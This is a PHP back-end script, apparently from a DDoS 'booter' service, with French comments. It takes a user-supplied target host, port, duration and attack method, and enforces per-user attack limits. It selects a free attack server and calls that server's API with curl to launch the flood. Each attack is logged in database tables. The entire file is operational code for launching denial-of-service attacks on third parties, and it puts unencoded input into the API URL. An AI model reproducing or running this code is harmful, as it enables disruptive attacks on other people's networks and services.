<?php

session_start();

require_once("../include/bdd.php");

if(isset($_SESSION['id'])){
	if(isset($_POST['target']) && isset($_POST['time']) && isset($_POST['methode'])){
		$getUser=$pdo->prepare("SELECT * FROM `users` WHERE `id`=?");
		$getUser->execute(array($_SESSION['id']));
		$userInfo=$getUser->fetch();
		
		$maxAttacks=$userInfo['concurrents'];
		$maxTime=$userInfo['secondes'];
		
		if($_POST['time'] <= $maxTime){
			$getAttacks=$pdo->prepare("SELECT * FROM `attaques` WHERE `userid`=? AND `timestamp`>?");
			$getAttacks->execute(array($_SESSION['id'], time()));
			if($getAttacks->rowCount() < $maxAttacks){
				$getServer=$pdo->prepare("SELECT * FROM `servers` WHERE `type`=7 AND `methodes` LIKE ? AND `statut`=1");
				$getServer->execute(array("%".$_POST['methode']."%"));
				if($getServer->rowCount() != 0){
					$found=false; //On part du principe qu'aucun serveur n'est disponnible
					while($serv=$getServer->fetch()){
						if($found == false){
							if($serv['active_concurent'] < $serv['max_concurent']){
								$found=true; //On a un serveur de dispo donc on effectue la requête api
								$apiurl=$serv['api'];
								$apiurl=str_replace("%hote%",$_POST['target'],$apiurl);
								$apiurl=str_replace("%temps%",$_POST['time']-5,$apiurl);
								$apiurl=str_replace("%port%",$_POST['port'],$apiurl);
								$apiurl=str_replace("%methode%",$_POST['methode'],$apiurl);
								
								$newConcurent=$serv['active_concurent']+1; //Nouveau nb d'attaque en cours
								
								$updateServer=$pdo->prepare("UPDATE `servers` SET `active_concurent`=? WHERE `id`=?");
								$updateServer->execute(array($newConcurent,$serv['id'])); //On update le nb d'attaque en cours sur le serveur
								
								
								$timestamp=time();
								$timestampEnd=$timestamp+$_POST['time'];
								
								$addAttack=$pdo->prepare("INSERT INTO `attaques`(`server`, `type`, `userid`, `username`, `target`, `duree`, `date`, `timestamp`, `timestamp_end`) VALUES (?,?,?,?,?,?,?,?,?)");
								$addAttack->execute(array($serv['id'], 4, $_SESSION['id'], $_SESSION['username'], $_POST['target'], $_POST['time'], date("d-m-Y à H:i:s"), $timestamp, $timestampEnd)); //Ajout du log d'attaque dans la table d'attaque
																
								//Envoi vers l'api
									$curl = curl_init();

									curl_setopt_array($curl, array(
										CURLOPT_RETURNTRANSFER => true,
										CURLOPT_URL => $apiurl,
										CURLOPT_CUSTOMREQUEST => "GET"
									));

									$response = curl_exec($curl);

									curl_close($curl);
								//Fin de la requête
								
								if($response == "success"){
									$addLog=$pdo->prepare("INSERT INTO `logs`(`action`, `userid`, `username`, `date`, `content`) VALUES (?,?,?,?,?)");
									$logContent=json_encode(array("cible" => $_POST['target'], "duree" => $_POST['time'], "serveur" => $serv['id'], "methode" => $_POST['methode']));
									$addLog->execute(array("attaque", $_SESSION['id'], $_SESSION['username'], date("d-m-Y à H:i:s"), $logContent)); //Ajout du log dans la table logs
									
									echo "success"; //On retourne un code d'erreur bon
									exit();
								} else {
									$deleteAttaque=$pdo->prepare("DELETE FROM `attaques` WHERE `id`=?");
									$deleteAttaque->execute(array($attackID));
									
									echo "apierror : ".$response;
									exit();
								}
							}
						}
					}
					if($found==false){ //Si après la boucle qui check tous les serveurs, aucun n'est dispo, on retourne l'erreur 'noserver'
						echo "noserver";
					}
				} else {
					echo "noserver";
				}
			} else {
				echo "maxconcurent";
			}
		} else {
			echo "maxtime";
		}
	}
} else {
	echo "not login";
}


?>